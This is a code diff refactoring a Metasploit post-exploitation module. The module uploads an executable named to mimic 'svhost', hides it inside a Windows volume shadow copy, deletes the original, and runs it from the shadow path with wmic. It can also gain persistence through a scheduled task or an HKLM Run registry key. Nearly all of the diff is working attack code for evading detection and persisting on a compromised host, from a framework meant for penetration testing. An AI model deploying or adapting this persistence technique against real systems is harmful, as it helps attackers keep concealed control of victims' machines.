@@ -28,79 +28,117 @@ class Metasploit4 < Msf::Post
         This module will attempt to create a persistant payload
         in new volume shadow copy.This is based on the VSSOwn
         Script originally posted by Tim Tomes and Mark Baggett.
-        Works on win2k3 and later.
-        },
+        This module has been tested successfully on Windows 7.
+      },
       'License'              => MSF_LICENSE,
       'Platform'             => ['win'],
       'SessionTypes'         => ['meterpreter'],
       'Author'               => ['MrXors <Mr.Xors[at]gmail.com>'],
       'References'           => [
         [ 'URL', 'http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html' ],
-        [ 'URL', 'http://www.irongeek.com/i.php?page=videos/hack3rcon2/tim-tomes-and-mark-baggett-lurking-in-the-shadows']]
+        [ 'URL', 'http://www.irongeek.com/i.php?page=videos/hack3rcon2/tim-tomes-and-mark-baggett-lurking-in-the-shadows']
+      ]
     ))
+
     register_options(
       [
         OptString.new('VOLUME', [ true, 'Volume to make a copy of.', 'C:\\']),
-        OptBool.new('EXECUTE', [ true, 'Run the .exe on the remote system.', true]),
-        OptBool.new('SCHTASK', [ false, 'Create a schtask.exe for EXE.', false]),
-        OptBool.new('RUNKEY', [ false, 'Create AutoRun Key on HKLM\Software\Microsoft\Windows\CurrentVersion\Run .', false]),
-        OptInt.new('DELAY', [ false, 'Delay in Minutes for Reconnect attempt.Needs SCHTASK set to true to work.default delay is 1 minute.', 1]),
-        OptString.new('RPATH', [ false, 'Path on remote system to place Executable.Example \\\\Windows\\\\Temp (DO NOT USE C:\\ in your RPATH!)', ]),
+        OptBool.new('EXECUTE', [ true, 'Run the EXE on the remote system.', true]),
+        OptBool.new('SCHTASK', [ true, 'Create a Scheduled Task for the EXE.', false]),
+        OptBool.new('RUNKEY', [ true, 'Create AutoRun Key for the EXE', false]),
+        OptInt.new('DELAY', [ true, 'Delay in Minutes for Reconnect attempt. Needs SCHTASK set to true to work. Default delay is 1 minute.', 1]),
+        OptString.new('RPATH', [ false, 'Path on remote system to place Executable. Example: \\\\Windows\\\\Temp (DO NOT USE C:\\ in your RPATH!)', ]),
         OptPath.new('PATH', [ true, 'Path to Executable on your local system.'])
       ], self.class)
+
   end
 
   def run
-    path = "#{datastore['PATH']}"
+    path = datastore['PATH']
+    @clean_up = ""
+
+    print_status("Checking requirements...")
+
+    os = sysinfo['OS']
+    unless os =~ /Windows 7/
+      print_error("This module has been tested only on Windows 7")
+      return
+    end
+
     unless is_admin?
       print_error("This module requires admin privs to run")
       return
     end
+
     if is_uac_enabled?
       print_error("This module requires UAC to be bypassed first")
       return
     end
+
+    print_status("Starting Volume Shadow Service...")
     unless start_vss
+      print_error("Unable to start the Volume Shadow Service")
       return
     end
-    upload(session, path, datastore['RPATH'])
-    volume_shadow_copy
-    delete_executable(@location, @file_name)
-    cmd = "cmd.exe /c vssadmin List Shadows\| find \"Shadow Copy Volume\""
+
+    print_status("Uploading #{path}....")
+    remote_file = upload(path, datastore['RPATH'])
+
+    print_status("Creating Shadow Volume Copy...")
+    unless volume_shadow_copy
+      fail_with(Failure::Unknown, "Failed to create a new shadow copy")
+    end
+
+    print_status("Finding the Shadow Copy Volume...")
     volume_data_id = []
+    cmd = "cmd.exe /c vssadmin List Shadows| find \"Shadow Copy Volume\""
     output = cmd_exec(cmd)
+    
     output.each_line do |line|
       cmd_regex = /HarddiskVolumeShadowCopy\d{1,9}/.match("#{line}")
       volume_data_id = "#{cmd_regex}"
     end
-    execute_executable(volume_data_id, @location, @file_name)
-    schtasks(volume_data_id, @location, @file_name)
-    regkey(@glogal_location)
-    log_file
+
+    print_status("Deleting malware...")
+    file_rm(remote_file)
+
+    if datastore["EXECUTE"]
+      print_status("Executing #{remote_file}...")
+      execute(volume_data_id, remote_file)
+    end
+
+    if datastore["SCHTASK"]
+      print_status("Creating Scheduled Task...")
+      schtasks(volume_data_id, remote_file)
+    end
+
+    if datastore["RUNKEY"]
+      print_status("Installing as autorun in the registry...")
+      install_registry(volume_data_id, remote_file)
+    end
+
+    unless @clean_up.empty?
+      log_file
+    end
   end
 
-  def upload(session, file, trgloc="")
-    @location = ""
-    @file_name = ""
-    file_on_target = ""
-    @clean_up = ""
-    if not ::File.exists?(file)
-      raise "File to Upload does not exists!"
+  def upload(file, trg_loc="")
+    if trg_loc.nil? or trg_loc.empty?
+      location = "\\Windows\\Temp"
     else
-      if trgloc == ""
-        @location = "\\Windows\\Temp"
-      else
-        @location = trgloc
-      end
-      @file_name  = "svhost#{rand(100)}.exe"
-      file_on_target = "#{@location}\\#{@file_name}"
-      print_status("Uploading #{file}....")
-      begin
-        upload_file("#{file_on_target}","#{file}")
-      rescue ::Rex::Post::Meterpreter::RequestError => e
-        fail_with(Failure::NotFound, e.message)
-      end
+      location = trg_loc
     end
+
+    file_name  = "svhost#{rand(100)}.exe"
+    file_on_target = "#{location}\\#{file_name}"
+
+    begin
+      upload_file("#{file_on_target}","#{file}")
+    rescue ::Rex::Post::Meterpreter::RequestError => e
+      fail_with(Failure::NotFound, e.message)
+    end
+
+    return file_on_target
   end
 
   def volume_shadow_copy
@@ -109,58 +147,38 @@ class Metasploit4 < Msf::Post
     rescue ::Rex::Post::Meterpreter::RequestError => e
       fail_with(Failure::NotFound, e.message)
     end
+
     if id
-      print_good("Shadow Volume Copy Created #{id}")
       return true
     else
       return false
     end
   end
 
-  def delete_executable(location, file_name)
-    print_good("Deleting Malware #{location}\\#{file_name}!")
-    delete_test = file_rm("#{location}\\#{file_name}")
-    print_good("Clean Up Complete.")
+  def execute(volume_id, exe_path)
+    run_cmd = "cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe process call create \\\\?\\GLOBALROOT\\Device\\#{volume_id}\\#{exe_path}"
+    cmd_exec(run_cmd)
   end
 
-  def execute_executable(volume_id, exe_path, exe_name)
-    @glogal_location = "\\\\?\\GLOBALROOT\\Device\\#{volume_id}\\#{exe_path}\\#{exe_name}"
-    if datastore["EXECUTE"]
-      print_good("Running Executable!")
-      run_cmd = "cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe process call create \\\\?\\GLOBALROOT\\Device\\#{volume_id}\\#{exe_path}\\#{exe_name}"
-      run_malware = cmd_exec(run_cmd)
-    else
-      return
-    end
+  def schtasks(volume_id, exe_path)
+    sch_name = Rex::Text.rand_text_alpha(rand(8)+8)
+    global_root = "\"\\\\?\\GLOBALROOT\\Device\\#{volume_id}\\#{exe_path}\""
+    sch_cmd = "cmd.exe /c %SYSTEMROOT%\\system32\\schtasks.exe /create /sc minute /mo #{datastore["DELAY"]} /tn \"#{sch_name}\" /tr #{global_root}"
+    cmd_exec(sch_cmd)
+    @clean_up << "execute -H -f cmd.exe -a \"/c schtasks.exe /delete /tn #{sch_name} /f\"\n"
   end
 
-  def schtasks(volume_data_id, location, file_name)
-    if datastore["SCHTASK"]
-      sch_name = Rex::Text.rand_text_alpha(rand(8)+8)
-      print_good("Creating Service..........")
-      global_root = "\\\\?\\GLOBALROOT\\Device\\#{volume_data_id}\\#{location}\\#{file_name}"
-      sch_cmd = "cmd.exe /c %SYSTEMROOT%\\system32\\schtasks.exe /create /sc minute /mo #{datastore["DELAY"]} /tn \"#{sch_name}\" /tr #{global_root}"
-      service_malware_go = cmd_exec(sch_cmd)
-      @clean_up << "execute -H -f cmd.exe -a \"/c schtasks.exe /delete /tn #{sch_name} /f\"\n"
+  def install_registry(volume_id, exe_path)
+    global_root =  "cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe process call create \\\\?\\GLOBALROOT\\Device\\#{volume_id}\\#{exe_path}"
+    nam = Rex::Text.rand_text_alpha(rand(8)+8)
+    hklm_key = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    print_status("Installing into autorun as #{hklm_key}\\#{nam}")
+    res = registry_setvaldata("#{hklm_key}", nam, "#{global_root}", "REG_SZ")
+    if res
+      print_good("Installed into autorun as #{hklm_key}\\#{nam}")
+      @clean_up << "reg  deleteval -k HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v #{nam}\n"
     else
-      return
-    end
-  end
-
-  def regkey(path_to_exe)
-    if datastore["RUNKEY"]
-      nam = Rex::Text.rand_text_alpha(rand(8)+8)
-      hklm_key = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-      print_status("Installing into autorun as #{hklm_key}\\#{nam}")
-      if nam
-        registry_setvaldata("#{hklm_key}",nam,path_to_exe,"REG_SZ")
-        print_good("Installed into autorun as #{hklm_key}\\#{nam}")
-        @clean_up << "reg  deleteval -k HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v #{nam}\n"
-      else
-        print_error("Error: failed to open the registry key for writing")
-      end
-    else
-      return
+      print_error("Error: failed to open the registry key for writing")
     end
   end
 
@@ -178,4 +196,5 @@ class Metasploit4 < Msf::Post
     file_local_write(clean_rc, @clean_up)
     print_status("Cleanup Meterpreter RC File: #{clean_rc}")
   end
+
 end
